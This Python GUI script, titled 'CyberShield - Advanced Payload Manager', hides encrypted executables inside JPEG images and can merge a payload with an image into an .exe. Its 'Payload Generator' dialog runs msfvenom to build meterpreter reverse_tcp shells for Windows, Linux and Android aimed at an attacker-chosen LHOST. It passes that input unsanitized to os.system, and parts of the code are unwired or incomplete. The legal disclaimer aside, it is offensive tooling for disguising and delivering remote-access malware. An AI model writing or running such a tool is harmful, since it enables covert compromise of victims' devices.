import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from PIL import Image, ImageTk
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import os
import shutil
import threading
import hashlib
from pillow_heif import register_heif_opener

register_heif_opener()

class ModernPayloadEmbedder:
    def __init__(self, root):
        self.root = root
        self.root.title("CyberShield - Advanced Payload Manager")
        self.root.geometry("800x600")
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.configure_styles()
        
        # Security parameters
        self.encryption_key = None
        self.hmac_key = None
        self.payload_path = ""
        self.image_path = ""
        self.output_path = ""
        
        # Initialize components
        self.create_widgets()
        self.setup_menu()
        
        # Security disclaimer
        self.show_disclaimer()

    def configure_styles(self):
        """Configure custom GUI styles"""
        self.style.configure('TButton', 
                            padding=6, 
                            relief='flat',
                            font=('Helvetica', 10))
        
        self.style.configure('Red.TButton', 
                            foreground='red',
                            background='#ffe6e6')
        
        self.style.configure('Green.TButton', 
                            foreground='green',
                            background='#e6ffe6')
        
        self.style.map('TButton',
            foreground=[('active', 'white'), ('pressed', 'white')],
            background=[('active', '#45a049'), ('pressed', '#398439')]
        )

    def show_disclaimer(self):
        disclaimer = """[ LEGAL AND ETHICAL USE AGREEMENT ]
This software is strictly for authorized:
- Penetration testing
- Security research
- Educational purposes

By using this tool, you agree to:
1. Obtain proper authorization
2. Comply with all applicable laws
3. Never engage in malicious activities

Violations may result in legal consequences."""
        messagebox.showinfo("Legal Agreement", disclaimer)

    def setup_menu(self):
        menu_bar = tk.Menu(self.root)
        self.root.config(menu=menu_bar)
        
        # File menu
        file_menu = tk.Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.reset_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)
        
        # Tools menu
        tools_menu = tk.Menu(menu_bar, tearoff=0)
        tools_menu.add_command(label="Payload Generator", command=self.show_payload_gen)
        tools_menu.add_command(label="Steganalyzer", command=self.show_steganalyzer)
        menu_bar.add_cascade(label="Tools", menu=tools_menu)

    def create_widgets(self):
        self.notebook = ttk.Notebook(self.root)
        
        # Main Operations Tab
        self.main_tab = ttk.Frame(self.notebook)
        self.create_main_interface()
        
        # Settings Tab
        self.settings_tab = ttk.Frame(self.notebook)
        self.create_settings_interface()
        
        self.notebook.add(self.main_tab, text="Operations")
        self.notebook.add(self.settings_tab, text="Security Settings")
        self.notebook.pack(expand=1, fill='both')

    def create_main_interface(self):
        file_frame = ttk.LabelFrame(self.main_tab, text="File Management")
        file_frame.pack(pady=10, padx=10, fill='x')
        
        ttk.Button(file_frame, text="Select Payload", command=self.upload_payload).grid(row=0, column=0, padx=5)
        self.payload_label = ttk.Label(file_frame, text="No payload selected")
        self.payload_label.grid(row=0, column=1, padx=5)
        
        ttk.Button(file_frame, text="Select Carrier File", command=self.upload_image).grid(row=1, column=0, padx=5)
        self.image_label = ttk.Label(file_frame, text="No carrier selected")
        self.image_label.grid(row=1, column=1, padx=5)
        
        preview_frame = ttk.LabelFrame(self.main_tab, text="File Preview")
        preview_frame.pack(pady=10, fill='both', expand=True)
        self.preview_canvas = tk.Canvas(preview_frame, bg='#2d2d2d')
        self.preview_canvas.pack(fill='both', expand=True)
        
        self.progress = ttk.Progressbar(self.main_tab, mode='determinate')
        self.progress.pack(fill='x', padx=10, pady=5)
        
        self.log_console = scrolledtext.ScrolledText(self.main_tab, height=8)
        self.log_console.pack(fill='x', padx=10, pady=5)
        self.log("Application initialized")

    def create_settings_interface(self):
        security_frame = ttk.LabelFrame(self.settings_tab, text="Advanced Security")
        security_frame.pack(pady=10, padx=10, fill='x')
        
        ttk.Label(security_frame, text="AES-256 Encryption Key:").grid(row=0, column=0)
        self.enc_key_entry = ttk.Entry(security_frame, show="*")
        self.enc_key_entry.grid(row=0, column=1)
        
        ttk.Label(security_frame, text="HMAC Key:").grid(row=1, column=0)
        self.hmac_key_entry = ttk.Entry(security_frame, show="*")
        self.hmac_key_entry.grid(row=1, column=1)
        
        ttk.Button(security_frame, text="Generate Keys", command=self.generate_keys).grid(row=2, columnspan=2)

    def generate_keys(self):
        self.encryption_key = os.urandom(32)
        self.hmac_key = os.urandom(32)
        self.enc_key_entry.delete(0, tk.END)
        self.enc_key_entry.insert(0, self.encryption_key.hex())
        self.hmac_key_entry.delete(0, tk.END)
        self.hmac_key_entry.insert(0, self.hmac_key.hex())
        self.log("New encryption keys generated")

    def log(self, message):
        self.log_console.insert(tk.END, f"[LOG] {message}\n")
        self.log_console.see(tk.END)

    def upload_payload(self):
        file_types = [('Executables', '*.exe *.elf *.dmg'), ('All files', '*.*')]
        file_path = filedialog.askopenfilename(title="Select Payload", filetypes=file_types)
        if file_path:
            self.payload_path = file_path
            self.payload_label.config(text=os.path.basename(file_path))
            self.log(f"Payload selected: {file_path}")

    def upload_image(self):
        img_types = [('Images', '*.jpg *.jpeg *.png *.heic *.bmp'), ('All files', '*.*')]
        file_path = filedialog.askopenfilename(title="Select Carrier File", filetypes=img_types)
        if file_path:
            self.image_path = file_path
            self.image_label.config(text=os.path.basename(file_path))
            self.show_image_preview(file_path)

    def show_image_preview(self, image_path):
        try:
            img = Image.open(image_path)
            img.thumbnail((400, 300))
            photo = ImageTk.PhotoImage(img)
            self.preview_canvas.create_image(20, 20, image=photo, anchor='nw')
            self.preview_canvas.image = photo
        except Exception as e:
            self.log(f"Preview error: {str(e)}")

    def process_file(self):
        if not self.validate_inputs():
            return
        threading.Thread(target=self._process_file_threaded, daemon=True).start()

    def _process_file_threaded(self):
        try:
            self.progress['value'] = 0
            output_type = "secure_img"
            
            if output_type == 'secure_img':
                self.create_secure_image()
            elif output_type == 'executable':
                self.create_executable()
            
            self.progress['value'] = 100
            self.log("Processing completed successfully")
        except Exception as e:
            self.log(f"Processing failed: {str(e)}")
            messagebox.showerror("Error", f"Processing failed: {str(e)}")

    def create_secure_image(self):
        with Image.open(self.image_path) as img:
            if img.mode in ('RGBA', 'LA'):
                img = img.convert('RGB')
            
            temp_path = "temp_secure.jpg"
            img.save(temp_path, "JPEG", quality=95, optimize=True)
            
            encrypted_payload = self.encrypt_payload()
            with open(temp_path, "ab") as f:
                f.write(b"%%METADATA_START%%")
                f.write(f"PAYLOAD_SIZE:{len(encrypted_payload)}".encode())
                f.write(encrypted_payload)
            
            self.output_path = "output_secure.jpg"
            os.rename(temp_path, self.output_path)

    def encrypt_payload(self):
        cipher = AES.new(self.encryption_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(open(self.payload_path, "rb").read())
        return cipher.nonce + tag + ciphertext

    def create_executable(self):
        with open(self.payload_path, "rb") as payload_file, \
             open(self.image_path, "rb") as img_file:
            combined = payload_file.read() + self.add_metadata(img_file.read())
        
        self.output_path = "output.exe"
        with open(self.output_path, "wb") as out_file:
            out_file.write(combined)

    def add_metadata(self, data):
        hmac = hashlib.pbkdf2_hmac('sha256', data, self.hmac_key, 100000)
        return data + hmac

    def validate_inputs(self):
        if not all([self.payload_path, self.image_path]):
            messagebox.showerror("Error", "Please select both payload and carrier files")
            return False
        return True

    def reset_session(self):
        self.payload_path = ""
        self.image_path = ""
        self.payload_label.config(text="No payload selected")
        self.image_label.config(text="No carrier selected")
        self.preview_canvas.delete("all")
        self.log("Session reset")

    def show_payload_gen(self):
        payload_types = {
            "Windows": "windows/meterpreter/reverse_tcp",
            "Linux": "linux/x86/meterpreter/reverse_tcp",
            "Android": "android/meterpreter/reverse_tcp"
        }
        
        def generate():
            try:
                payload_type = payload_var.get()
                lhost = lhost_entry.get()
                lport = lport_entry.get()
                
                cmd = f"msfvenom -p {payload_types[payload_type]} LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
                os.system(cmd)
                messagebox.showinfo("Success", "Payload generated as payload.exe")
                top.destroy()
            except Exception as e:
                messagebox.showerror("Error", str(e))

        top = tk.Toplevel(self.root)
        top.title("Payload Generator")
        
        ttk.Label(top, text="Payload Type:").grid(row=0, column=0, padx=5, pady=5)
        payload_var = tk.StringVar()
        ttk.Combobox(top, textvariable=payload_var, values=list(payload_types.keys())).grid(row=0, column=1)
        
        ttk.Label(top, text="LHOST:").grid(row=1, column=0, padx=5, pady=5)
        lhost_entry = ttk.Entry(top)
        lhost_entry.grid(row=1, column=1)
        
        ttk.Label(top, text="LPORT:").grid(row=2, column=0, padx=5, pady=5)
        lport_entry = ttk.Entry(top)
        lport_entry.grid(row=2, column=1)
        
        ttk.Button(top, text="Generate", command=generate).grid(row=3, columnspan=2, pady=10)

    def show_steganalyzer(self):
        messagebox.showinfo("Info", "Steganalysis feature coming in next update")

if __name__ == "__main__":
    root = tk.Tk()
    app = ModernPayloadEmbedder(root)
    root.mainloop()